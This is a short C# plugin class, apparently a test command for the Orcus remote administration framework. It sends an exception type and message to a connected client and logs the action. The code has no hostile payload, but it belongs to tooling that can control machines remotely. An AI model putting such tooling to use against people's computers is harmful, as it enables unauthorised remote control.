using System;
using System.Collections.Generic;
using System.Text;
using Orcus.Administration.Plugins;

namespace ExceptionTest
{
    internal class ExceptionTestCommand : Command
    {
        public override void ResponseReceived(byte[] parameter)
        {
        }

        public void ThrowException(int exceptionType, string message)
        {
            var package = new List<byte>();
            package.AddRange(BitConverter.GetBytes(exceptionType));
            package.AddRange(Encoding.UTF8.GetBytes(message));

            ConnectionInfo.SendCommand(this, package.ToArray());

            LogService.Send("Throw exception");
        }

        protected override uint GetId()
        {
            return 1001;
        }
    }
}